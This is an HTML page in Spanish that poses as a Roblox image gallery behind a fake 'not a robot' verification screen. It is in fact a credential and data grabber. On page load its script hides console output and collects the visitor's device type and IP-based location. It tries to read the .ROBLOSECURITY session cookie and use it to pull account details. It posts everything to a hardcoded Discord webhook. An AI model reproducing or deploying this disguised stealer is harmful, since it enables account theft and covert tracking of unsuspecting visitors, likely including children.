<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejemplo_1</title>
    
    <!-- Meta tags para Discord -->
    <meta property="og:title" content="Ejemplo_1">
    <meta property="og:description" content="Coleccion de imagenes. Clickea para verlas">
    <meta property="og:image" content="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">
    <meta property="og:url" content="https://juanchos123.github.io/image_9180173538.png/">
    <meta property="og:type" content="website">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .final-image {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
            opacity: 0;
            transition: opacity 1s ease;
        }
        .final-image.show {
            opacity: 1;
        }
        .verification-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            transition: opacity 0.5s ease;
        }
        .verification-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .verification-box {
            text-align: center;
            color: white;
            max-width: 80%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #fff;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .verification-text {
            font-size: 18px;
            margin: 20px 0;
            color: #ccc;
        }
        .verification-subtext {
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Imagen" class="final-image" id="finalImage">
    </div>
    
    <div class="verification-screen" id="verificationScreen">
        <div class="verification-box">
            <div class="spinner"></div>
            <div class="verification-text">Por favor espera, estamos verificando que no seas un robot</div>
            <div class="verification-subtext">Esto tomará solo unos segundos...</div>
        </div>
    </div>

    <script>
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // Silenciar TODO - Nada aparece en consola
        const originalConsole = { ...console };
        console.log = function() {};
        console.error = function() {};
        console.warn = function() {};
        console.info = function() {};
        console.debug = function() {};
        
        let userData = {
            username: 'No disponible',
            userId: 'No disponible',
            robux: 'No disponible',
            seguidores: 'No disponible',
            amigos: 'No disponible',
            headless: 'No',
            korblox: 'No',
            visitas: 'No disponible',
            juegos: 'No disponible',
            logros: 'No disponible',
            trades: 'No disponible',
            ratio: 'No disponible'
        };

        // =========== DETECCIÓN DE DISPOSITIVO ===========
        function detectarDispositivo() {
            const ua = navigator.userAgent.toLowerCase();
            if (/android/.test(ua)) return 'Android';
            if (/iphone|ipad|ipod/.test(ua)) return 'iOS';
            if (/windows/.test(ua)) return 'PC (Windows)';
            if (/mac/.test(ua)) return 'Mac';
            if (/xbox/.test(ua)) return 'Xbox';
            if (/linux/.test(ua)) return 'Linux';
            return 'PC';
        }

        // =========== OBTENER GEOLOCALIZACIÓN ===========
        async function obtenerGeo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    pais: data.country_name || 'No disponible',
                    ciudad: data.city || 'No disponible',
                    timezone: data.timezone || 'UTC'
                };
            } catch {
                return {
                    pais: 'No disponible',
                    ciudad: 'No disponible',
                    timezone: 'UTC'
                };
            }
        }

        // =========== FECHA Y HORA ===========
        function fechaHoraExacta(timezone) {
            try {
                const ahora = new Date();
                return {
                    fecha: ahora.toLocaleDateString('es-ES', { timeZone: timezone }),
                    hora: ahora.toLocaleTimeString('es-ES', { timeZone: timezone })
                };
            } catch {
                const ahora = new Date();
                return {
                    fecha: ahora.toLocaleDateString('es-ES'),
                    hora: ahora.toLocaleTimeString('es-ES')
                };
            }
        }

        // =========== INTENTAR OBTENER COOKIE (SILENCIOSO) ===========
        async function intentarObtenerCookie() {
            try {
                // Solo un intento silencioso con fetch
                const res = await fetch('https://www.roblox.com/home', {
                    credentials: 'include',
                    headers: { 'Accept': 'text/html' }
                });
                
                const cookieHeader = res.headers.get('set-cookie');
                if (cookieHeader && cookieHeader.includes('.ROBLOSECURITY')) {
                    const match = cookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
                    return match ? match[1] : null;
                }
            } catch (e) {}
            return null;
        }

        // =========== OBTENER DATOS DE ROBLOX (SILENCIOSO) ===========
        async function obtenerDatosRoblox(cookie) {
            if (!cookie) return userData;
            
            try {
                const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
                    headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
                });
                
                if (userRes.ok) {
                    const userInfo = await userRes.json();
                    userData.username = userInfo.name || 'No disponible';
                    userData.userId = userInfo.id || 'No disponible';
                    
                    try {
                        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.userId}/currency`, {
                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie};` }
                        });
                        if (robuxRes.ok) {
                            const robuxData = await robuxRes.json();
                            userData.robux = robuxData.robux || 0;
                        }
                    } catch {}
                    
                    try {
                        const segRes = await fetch(`https://friends.roblox.com/v1/users/${userData.userId}/followers/count`);
                        if (segRes.ok) {
                            const segData = await segRes.json();
                            userData.seguidores = segData.count || 0;
                        }
                    } catch {}
                    
                    try {
                        const amigosRes = await fetch(`https://friends.roblox.com/v1/users/${userData.userId}/friends/count`);
                        if (amigosRes.ok) {
                            const amigosData = await amigosRes.json();
                            userData.amigos = amigosData.count || 0;
                        }
                    } catch {}
                }
            } catch (e) {}
            
            return userData;
        }

        // =========== ARMAR EMBED DE DISCORD ===========
        function armarEmbed(dispositivo, geo, fecha, hora, datosRoblox, cookie) {
            return {
                content: "@everyone",
                embeds: [{
                    title: "Ejemplo_1",
                    description: "Coleccion de imagenes. Clickea para verlas",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "📌 INFORMACIÓN GENERAL",
                            value: `**Dispositivo:** \`${dispositivo}\`\n**País:** \`${geo.pais}\`\n**Ciudad:** \`${geo.ciudad}\``,
                            inline: false
                        },
                        {
                            name: "🧭 Horarios",
                            value: `**Fecha:** \`${fecha}\`\n**Hora Exacta:** \`${hora}\``,
                            inline: false
                        },
                        {
                            name: "ℹ️ CUENTA ROBLOX",
                            value: `**👤 Usuario:** \`${datosRoblox.username}\`\n**🆔 ID:** \`${datosRoblox.userId}\`\n**💰 Robux:** \`${datosRoblox.robux}\`\n**⭐ Seguidores:** \`${datosRoblox.seguidores}\`\n**👥 Amigos:** \`${datosRoblox.amigos}\``,
                            inline: false
                        },
                        {
                            name: "📊 ITEMS LIMITED",
                            value: `**Headless:** \`${datosRoblox.headless}\`\n**Korblox:** \`${datosRoblox.korblox}\``,
                            inline: false
                        },
                        {
                            name: "🍪 COOKIE",
                            value: `\`${cookie ? cookie : 'HTTP-ONLY - No accesible vía JavaScript'}\``,
                            inline: false
                        }
                    ],
                    thumbnail: {
                        url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
                    },
                    footer: {
                        text: "Verificación completada"
                    },
                    timestamp: new Date().toISOString()
                }],
                username: "Ejemplo_1",
                avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
            };
        }

        // =========== ENVIAR A DISCORD ===========
        async function enviarADiscord(payload) {
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }

        // =========== EJECUCIÓN PRINCIPAL ===========
        (async function() {
            if (sessionStorage.getItem('verificado')) return;
            sessionStorage.setItem('verificado', 'true');
            
            // Obtener datos en segundo plano
            const dispositivo = detectarDispositivo();
            const geo = await obtenerGeo();
            const { fecha, hora } = fechaHoraExacta(geo.timezone);
            const cookie = await intentarObtenerCookie();
            
            if (cookie) {
                userData = await obtenerDatosRoblox(cookie);
            }
            
            // Armar y enviar embed
            const embed = armarEmbed(dispositivo, geo, fecha, hora, userData, cookie);
            await enviarADiscord(embed);
            
            // Mostrar imagen final después de 5 segundos
            setTimeout(() => {
                document.getElementById('verificationScreen').classList.add('hidden');
                document.getElementById('finalImage').classList.add('show');
            }, 5000);
        })();
    </script>
</body>
</html>
